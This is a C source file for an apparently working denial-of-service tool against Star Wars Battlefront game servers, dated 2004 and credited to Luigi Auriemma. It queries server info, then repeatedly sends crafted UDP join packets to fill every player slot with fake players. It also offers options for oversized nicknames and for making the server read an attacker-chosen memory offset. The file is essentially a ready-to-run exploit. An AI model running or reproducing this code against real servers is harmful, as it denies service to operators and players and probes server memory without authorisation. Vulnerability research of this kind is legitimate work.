/*
    Copyright 2004 Luigi Auriemma

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307 USA

    http://www.gnu.org/licenses/gpl.txt
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "show_dump.h"
#include "swbcrc.h"
#include "rwbits.h"

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
    #define ONESEC  1000
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netinet/in.h>
    #include <netdb.h>

    #define ONESEC  1
#endif



#define VER         "0.3.1"
#define BUFFSZ      8192
#define PORT        3658
#define TIMEOUT     3
#define NEEDPWD     "\x05\x00\x00\x00\x01\x02\x00\x00\x00"
#define WRONGVER    "\x05\x00\x00\x00\x01\x04\x00\x00\x00"
#define CHR         'a'



void show_info_1_1(u_char *data);
int timeout(int sock);
u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer,
                        peerl;
    u_long      bits,
                mem_offset = 0;
    int         sd,
                i,
                len,
                pcklen,
                nicklen,
                on         = 1,
                timewait   = ONESEC,
                hexdump    = 0,
                guest      = 0,
                src_nat    = 0,
                dst_nat    = 0,
                info_only  = 0,
                server_ver = 0;   /* 0 = 1.0 and 1.01, 1 = 1.1, and so on */
    u_short     port = PORT;
    u_char      *buff,
                *pck,
                *b,
                *nick      = "",
                *pwd       = "";


    setbuf(stdout, NULL);

    fputs("\n"
        "Star Wars Battlefront Fake Players DoS and Tester "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 2) {
        printf("\n"
            "Usage: %s [options] <host>\n"
            "\n"
            "Options:\n"
            "-p PORT   server port (%d)\n"
            "-n NICK   the nick you want to use for your fake player (default is none)\n"
            "-w PASS   the password to use if the server is protected\n"
            "-i        shows server informations and exits. Works perfectly with servers\n"
            "          >= 1.1 but second half of the info are wrong for servers <= 1.01\n"
            "-t SEC    seconds to wait when the server is full, default is 1\n"
            "-v NUM    version number to use for joining a server, by default the number\n"
            "          is automatically scanned finding the exact server version\n"
            "\n"
            "Test options:\n"
            "-x        shows the hex dump of the join-reply packets received\n"
            "-g        enable the guest player, practically with one single packet is\n"
            "          able to fill 2 player positions and one of them is called Guest\n"
            "-s SIZE   uses a nickname constituited by SIZE chars '%c'\n"
            "-m 0xOFF  enable a server's option that lets clients to send a memory location\n"
            "          that will be read by the server (PS2 servers don't support it)\n"
            "-f NUM    another test option that enable the usage of internal IPs (NAT).\n"
            "          Since it is only for testing, all the IP and port used by this tool\n"
            "          are those of the same server. Use -f 1 to enable client's NAT, 2 for\n"
            "          the server or 3 to enable both\n"
            "\n", argv[0], port, CHR);
        exit(1);
    }

    argc--;
    for(i = 1; i < argc; i++) {
        switch(argv[i][1]) {
            case 'p': port = atoi(argv[++i]); break;
            case 'n': nick = argv[++i]; break;
            case 'w': pwd = argv[++i]; break;
            case 'i': info_only = 1; break;
            case 't': {
                timewait = atoi(argv[++i]);
                printf("- time to wait:   %d seconds\n", timewait);
#ifdef WIN32
                timewait *= 1000;
#endif
                } break;
            case 'v': server_ver = atoi(argv[++i]); break;
            case 'x': hexdump = 1; break;
            case 'g': guest = 1; break;
            case 's': {
                nicklen = atoi(argv[++i]);
                nick = malloc(nicklen + 1);
                if(!nick) std_err();
                memset(nick, CHR, nicklen);
                nick[nicklen] = 0x00;
                } break;
            case 'm': {
                i++;
                if(argv[i][1] == 'x') sscanf(argv[i], "0x%lx", &mem_offset);
                    else sscanf(argv[i], "%lu", &mem_offset);
                printf("- memory offset:   0x%08lx\n", mem_offset);
                } break;
            case 'f': {
                switch(atoi(argv[++i])) {
                    case 1: src_nat = 1; break;
                    case 2: dst_nat = 1; break;
                    case 3: src_nat = dst_nat = 1; break;
                    default: {
                        fputs("\nError: NAT options are 1, 2 or 3\n\n", stdout);
                        exit(1);
                        } break;
                }
                } break;
            default: {
                printf("\nError: wrong command-line argument (%s)\n\n", argv[i]);
                exit(1);
                } break;
        }
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    peer.sin_addr.s_addr  = resolv(argv[argc]);
    peer.sin_port         = htons(port);
    peer.sin_family       = AF_INET;

    peerl.sin_addr.s_addr = INADDR_ANY;
    peerl.sin_port        = htons(time(NULL));
    peerl.sin_family      = AF_INET;

    printf("- target   %s:%hu\n",
        inet_ntoa(peer.sin_addr), port);

    fputs("- request informations:\n", stdout);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sd) std_err();

    buff = malloc(BUFFSZ);
    if(!buff) std_err();

        /* BUILD INFO PACKET */

    memset(buff, 0x00, BUFFSZ); /* no longer needed */

    buff[0] = 2;                /* info packet */
    *(u_short *)(buff + 2) = 0xffff;
    *(u_short *)(buff + 4) = 0;
    b = buff + 5;

    bits = write_bits(0,  1, b, 0);
    bits = write_bits(time(NULL), 32, b, bits); // track ID 1 | used to track our
    bits = write_bits(0,  4, b, bits);          // track ID 2 | query in the reply

    pcklen = 5 + (bits >> 3);
    if(bits & 7) pcklen++;
    i = (pcklen - 5) & 3;       /* SWB decodes 32 bits of data each time */
    if(i) pcklen += (4 - i);

        /* END INFO PACKET */

    if(sendto(sd, buff, pcklen, 0, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();
    if(timeout(sd) < 0) {
        fputs("\nError: socket timeout, probably the server uses another port\n\n", stdout);
        exit(1);
    }
    if(recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL)
      < 0) std_err();
    show_info_1_1(buff);
    close(sd);

    if(info_only) return(0);

        /* BUILD JOIN PACKET */

    memset(buff, 0x00, BUFFSZ); /* no longer needed */

    buff[0] = 4;            /* join packet */
    *(u_short *)(buff + 2) = 0xffff;
    *(u_short *)(buff + 4) = 0;
    b = buff + 5;

    bits = write_bits(server_ver, 12, b, 0);
    bits = write_bits(swbcrc(pwd, strlen(pwd)), 32, b, bits);
    bits = write_bits(guest, 1, b, bits);   // if 1, add also a Guest player
    bits = write_bits(1, 2, b, bits);       // don't know

    nicklen = strlen(nick);
    bits = write_bits(nicklen, 8, b, bits);
    for(i = 0; i < nicklen; i++) {
        bits = write_bits(nick[i], 8, b, bits);
    }

    i = bits >> 3;
    if(bits & 7) i++;
    if(i & 3) i += (4 - (i & 3));
    bits = (i + 4) << 3;    /* 4 = there is a 32 bit number between the 2 bits containers */

    bits = write_bits(0, 32, b, bits);      // don't know
    if(mem_offset) {
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(mem_offset, 32, b, bits);
    } else {
        bits = write_bits(0, 1, b, bits);
    }

    bits = write_bits(1, 1, b, bits);       // don't know
    bits = write_bits(1, 1, b, bits);       // don't know

        /* IP and port in little-endian (I know that on a big-endian CPU this instructions
           don't return the exact IP and port, but is not important for this tool) */

    bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);    /* source IP */
    bits = write_bits(port, 16, b, bits);                           /* source port */

    if(src_nat) {   /* LAN IP and port of the client */
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);
        bits = write_bits(port, 16, b, bits);
    } else {
        bits = write_bits(0, 1, b, bits);
    }

    bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);    /* dest IP */
    bits = write_bits(port, 16, b, bits);                           /* dest port */

    if(dst_nat) {   /* LAN IP and port of the server */
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(1, 1, b, bits);
        bits = write_bits(ntohl(peer.sin_addr.s_addr), 32, b, bits);
        bits = write_bits(port, 16, b, bits);
    } else {
        bits = write_bits(0, 1, b, bits);
    }

    pcklen = 5 + (bits >> 3);
    if(bits & 7) pcklen++;
    i = (pcklen - 5) & 3;       /* SWB decodes 32 bits of data each time */
    if(i) pcklen += (4 - i);

        /* END JOIN PACKET */

    pck = malloc(pcklen);
    if(!pck) std_err();
    memcpy(pck, buff, pcklen);
    b = pck + 5;

    fputs("- start fake players attack:\n\n", stdout);
    for(;;) {
        for(;;) {
            fputs("  player: ", stdout);

            sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
            if(sd < 0) std_err();

            if(setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, (char *)&on, sizeof(on))
              < 0) std_err();
            peerl.sin_port++;
            if(bind(sd, (struct sockaddr *)&peerl, sizeof(peerl))
              < 0) std_err();

            if(sendto(sd, pck, pcklen, 0, (struct sockaddr *)&peer, sizeof(peer))
              < 0) std_err();
            fputc('.', stdout);

            if(timeout(sd) < 0) {
                fputs("\n"
                    "Error: socket timeout, no reply received\n"
                    "\n", stdout);
                exit(1);
            }
            len = recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL);
            if(len < 0) std_err();
            fputc('.', stdout);
            close(sd);

            if(*buff != 6) {
                if(buff[5] == 1) {
                    break;  // full
                } else if(!memcmp(buff, NEEDPWD, len)) {
                    fputs("\n"
                        "Error: seems the server is password protected, use the -w option and specify\n"
                        "       the correct password\n"
                        "\n", stdout);
                    exit(1);
                } if(!memcmp(buff, WRONGVER, len)) {
                    server_ver = read_bits(12, b, 0);
                    printf(" wrong version (%d), I try to scan the next version\n", server_ver++);
                    write_bits(server_ver, 12, b, 0);
                    continue;
                }

                fputs("\nError: unknown error, check the following dump:\n", stdout);
                show_dump(buff, len, stdout);
                exit(1);
            }

            fputs(" ok\n", stdout);

            if(hexdump) {
                show_dump(buff, len, stdout);
                fputc('\n', stdout);
            }
        }

        fputs(" server full\n", stdout);
        sleep(timewait);
    }

    return(0);
}



    /* STAR WARS BATTLEFRONT 1.1 */
void show_info_1_1(u_char *data) {
    u_long  len,
            bits = 0;

    data += 5;
    read_bits(32, data, bits); bits += 32;      /* track ID 1, the same of our query */
    read_bits(4, data, bits);  bits += 4;       /* track ID 1, the same of our query */
    fputs("\n  Server name:        ", stdout);
    len = read_bits(8, data, bits);                                                 bits += 8;
    while(len--) {
        fputc(read_bits(8, data, bits), stdout);
        bits += 8;
    }
    fputs("\n  Gametype:           ", stdout);
    len = read_bits(8, data, bits);                                                 bits += 8;
    while(len--) {
        fputc(read_bits(8, data, bits), stdout);
        bits += 8;
    }
    fputs("\n  Mission:            ", stdout);
    len = read_bits(8, data, bits);                                                 bits += 8;
    while(len--) {
        fputc(read_bits(8, data, bits), stdout);
        bits += 8;
    }
    fputc('\n', stdout);
    printf("  Dedicated           %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Team Auto Assign    %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Heroes              %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Team Damage         %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Password            %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  AI Units            %lu\n", read_bits(8, data, bits));                bits += 8;
    printf("  Score               %lu to ", read_bits(11, data, bits));             bits += 11;
    printf("%lu\n", read_bits(11, data, bits));                                     bits += 11;
    printf("  Players             %lu\n", read_bits(7, data, bits));                bits += 7;
    len = read_bits(7, data, bits);
    if(!len) {
        fputs("\n"
            " The version of this server is not compatible with the query protocol used by\n"
            " this tool. All the informations until Password should be correct\n"
            "\n", stdout);
        return;
    }
    bits += 7;
    printf("  Max Players         %lu\n", len);
    printf("  ???                 %lu\n", read_bits(3, data, bits));                bits += 3;
    printf("  ???                 %lu\n", read_bits(8, data, bits));                bits += 8;
    printf("  Min Players         %lu\n", read_bits(7, data, bits));                bits += 7;
    printf("  AI Difficulty       %lu\n", read_bits(2, data, bits));                bits += 2;
    printf("  Show Player Names   %s\n", read_bits(1, data, bits) ? "on" : "off");  bits += 1;
    printf("  Spawn Invincibility %lu\n", read_bits(6, data, bits));                bits += 6;
    fputc('\n', stdout);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    err = select(sock + 1, &fd_read, NULL, NULL, &tout);
    if(err < 0) std_err();
    if(!err) return(-1);
    return(0);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolv hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)hp->h_addr;
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif

